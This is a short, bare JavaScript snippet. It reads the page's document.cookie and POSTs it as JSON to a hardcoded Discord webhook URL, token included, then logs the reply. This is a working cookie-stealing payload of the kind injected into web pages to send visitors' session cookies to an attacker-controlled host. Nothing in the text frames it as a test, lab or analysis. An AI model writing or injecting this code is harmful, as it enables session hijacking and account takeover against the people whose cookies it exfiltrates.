const url = "https://discord.com/api/webhooks/1054896343296004116/Qnt4t2FGVI-WYW0xJOMiXe_wIaJNbyLWGt4SD6nDW71I-Ro3iGtxIzMqRYsEYb0eeVz9";

fetch(url, {
  method: "POST",
  body: JSON.stringify({ content: document.cookie }),
  headers: {
    "Content-Type": "application/json",
  },
})
  .then((response) => response.json())
  .then((data) => console.log(data));
